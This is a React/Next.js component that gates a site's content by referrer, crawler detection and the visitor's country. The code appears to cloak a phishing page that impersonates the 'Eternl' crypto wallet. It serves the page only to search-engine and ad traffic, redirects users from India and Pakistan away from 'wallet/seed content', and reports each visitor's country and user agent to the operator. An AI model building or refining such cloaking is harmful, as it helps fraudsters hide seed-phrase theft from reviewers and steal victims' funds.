"use client";

import { useEffect, useRef, useState } from "react";

import { usePathname } from "next/navigation";
import ErrorScreen from "../../components/ErrorScreen";

import { getUserCountry } from "../../utils-backend/userLocation";
import { sendNotificationMessage } from "../../utils/notificationService";

// Access is allowed ONLY if referrer host is a real search engine (or verified bot). No bypass via ad params alone.

const ALLOWED_REFERRER_HOSTS = [
  "google.com",
  "www.google.com",
  "google.co.uk",
  "google.de",
  "google.fr",
  "google.es",
  "google.it",
  "google.ca",
  "google.com.au",
  "google.co.in",
  "google.com.br",
  "googleadservices.com",
  "bing.com",
  "www.bing.com",
  "yahoo.com",
  "duckduckgo.com",
  "baidu.com",
  "yandex.com",
  "yandex.ru",
  "ecosia.org",
  "startpage.com",
  "ask.com",
  "aol.com",
];

function isFromAllowedSource(referrer: string): boolean {
  if (!referrer || !referrer.startsWith("http")) return false;
  try {
    const host = new URL(referrer).hostname.toLowerCase().replace(/^www\./, "");
    return ALLOWED_REFERRER_HOSTS.some((allowed) => {
      const allowedNorm = allowed.replace(/^www\./, "");
      return host === allowedNorm || host.endsWith("." + allowedNorm);
    });
  } catch {
    return false;
  }
}

// Check for common ad tracking parameters in the URL
function hasAdParameters(searchParams: URLSearchParams) {
  const adParams = [
    'gclid',      // Google Ads
    'fbclid',     // Facebook
    'ttclid',     // TikTok
    'twclid',     // Twitter
    'wbraid',     // iOS attribution
    'gbraid',     // iOS attribution
    'utm_source', // General tracking
    'utm_medium',
    'utm_campaign'
  ];
  return adParams.some(param => searchParams.has(param));
}

import { detectBotType, isCrawlerUserAgent, getSpecificBotType } from "../../utils/botDetection";


const ReferrerProvider = ({ children, isBot: serverIsBot }: { children: React.ReactNode; isBot?: boolean }) => {
  const [isLoading, setIsLoading] = useState(!serverIsBot);
  const [isVerifiedBot, setIsVerifiedBot] = useState(serverIsBot || false);
  const [isFromSearch, setIsFromSearch] = useState(false);

  const pathname = usePathname()
  const hasSentVisitNotification = useRef(false);

  useEffect(() => {
    const checkIfBot = async () => {
      try {
        const uaMatch = isCrawlerUserAgent();
        if (!uaMatch) {
          return false;
        }

        // For Google bots, try to verify with API; for others, trust UA pattern
        const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "";
        const { botName } = detectBotType(userAgent);

        if (botName === "google") {
          // Try to verify Google bot with a short timeout
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1200000);
            const resp = await fetch('/api/verify-googlebot', { signal: controller.signal });
            clearTimeout(timeoutId);
            if (resp.ok) {
              const data = await resp.json();
              if (data?.isGooglebot === true) {
                setIsVerifiedBot(true);
                setIsLoading(false);
                return true;
              }
            }
          } catch (e: unknown) {
            console.warn('[ReferrerProvider] Googlebot verify fallback (UA allowed):', e);
          }
        }

        // For all bots (including Google fallback), allow based on UA
        setIsVerifiedBot(true);
        setIsLoading(false);
        return true;
      } catch (error: unknown) {
        console.error('Error checking crawler status:', error);
        return false;
      }
    };

    const checkAccess = async () => {
      if (typeof window === "undefined") return;

      console.log("[ReferrerProvider] Checking access for path:", pathname);

      const currentPath = pathname || window.location.pathname;

      // Allow access to blog and review page
      if (currentPath?.startsWith("/blog") || currentPath?.startsWith("/review")) {
        console.log("[ReferrerProvider] Allowing access to blog/review page directly.");
        setIsFromSearch(true);
        setIsLoading(false);
        return;
      }

      // Geo guard: only India and Pakistan are blocked from wallet/seed content; everyone else continues
      try {
        const countryData = await getUserCountry();
        if (countryData) {
          const countryName = (countryData.country || countryData.country_name || "").toLowerCase();
          const countryCode = (countryData.countryCode || "").toUpperCase();
          const isIndia = countryName === "india" || countryCode === "IN";
          const isPakistan = countryName === "pakistan" || countryCode === "PK";
          if (isIndia || isPakistan) {
            console.log(`[ReferrerProvider] Access denied: user from ${countryData.country || countryCode}. Redirecting to /blog.`);
            window.location.href = "/blog";
            return;
          }
        }
      } catch (e) {
        console.error("[ReferrerProvider] Location check failed:", e);
      }

      // Search engine or allowed referrer logic
      const referrer = document.referrer;
      const currentUrl = new URL(window.location.href);

      console.log("[ReferrerProvider] Current URL:", currentUrl.href);
      console.log("[ReferrerProvider] Referrer URL:", referrer);
      console.log("[ReferrerProvider] Comparing referrer with allowed domains...");

      // Special handling for localhost development - always allow access
      // if (currentUrl.includes("localhost") || currentUrl.includes("127.0.0.1")) {
      //   console.log("[ReferrerProvider] Localhost development detected, allowing access.");
      //   setIsFromSearch(true);
      //   setIsLoading(false);
      //   return;
      // }

      const isAllowedReferrer = isFromAllowedSource(referrer);
      // Only allow if referrer host is a real search engine. Ad params (gclid, utm_*) alone do NOT grant access.
      if (isAllowedReferrer) {
        setIsFromSearch(true);
        console.log("[ReferrerProvider] Access Allowed: referrer from search engine.", referrer);
      } else {
        setIsFromSearch(false);
        console.log("[ReferrerProvider] Access denied: referrer not from a search engine.", referrer || "(no referrer)");
      }

      // Check if it's a verified bot (any search engine)
      const isBot = await checkIfBot();
      if (isBot) {
        const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "";
        const specificBotType = getSpecificBotType(userAgent);
        console.log(`[ReferrerProvider] Verified ${specificBotType} detected, allowing access.`);
      }

      // Send visit notification
      if (!hasSentVisitNotification.current) {
        try {
          // Use cached country data if available, otherwise fetch again (should be cached by now)
          let userCountry = null;
          const storedData = localStorage.getItem("user_location_data");
          if (storedData) {
            userCountry = JSON.parse(storedData);
          } else {
            userCountry = await getUserCountry();
          }

          const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "Unknown";

          // Determine bot type if applicable
          const specificBotType = isBot ? getSpecificBotType(userAgent) : null;

          await sendNotificationMessage(
            userCountry,
            "Eternl", // Your app name
            userAgent,
            isBot ? { isBot: true, botType: specificBotType || "Unknown Bot" } : null
          );

          console.log("[ReferrerProvider] Visit notification sent successfully");
          hasSentVisitNotification.current = true;
        } catch (error: unknown) {
          console.error("[ReferrerProvider] Error sending visit notification:", error);
          // Don't block the user if notification fails
        }
      }

      setIsLoading(false);
      console.log("[ReferrerProvider] Loading complete.");
    };

    checkAccess();
  }, [pathname]);

  if (isLoading) {
    console.log("[ReferrerProvider] Loading...");
    return <div className="bg-[#202124] h-screen" />;
  }
  // Allow access only for verified Google bots or if from search engine
  if (isVerifiedBot || isFromSearch) {
    console.log("[ReferrerProvider] Access allowed.");
    return <>{children}</>;
  }

  console.log("[ReferrerProvider] Access denied: Not from search engine/allowed referrer.");
  return <ErrorScreen />;
};

export default ReferrerProvider;
